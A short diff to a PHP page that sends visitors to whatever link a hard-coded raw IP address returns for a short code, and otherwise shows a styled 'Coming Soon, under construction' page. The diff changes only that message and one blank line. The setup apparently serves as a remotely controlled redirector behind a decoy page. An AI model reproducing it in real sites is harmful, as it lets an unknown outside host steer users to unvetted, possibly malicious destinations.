@@ -1,5 +1,4 @@
 <?php 
-
 function get($url, $params=array()) {	
    $url = $url.'?'.http_build_query($params, '', '&');
    $ch = curl_init();
@@ -18,6 +17,6 @@ $link = get('http://147.182.178.125/'.$code);
 if(isset($code) && strlen($code) < 10){
 	header("Location:".$link);
 }else{
-	echo "Coming Soon";	
+	echo "<h1 style='margin: 0 auto;position: absolute;top: 50%;left: 45%;'>Coming Soon<br><span style='font-size:16px;'>Pardon our mess were under construction</span></h1>";	
 }
 ?>
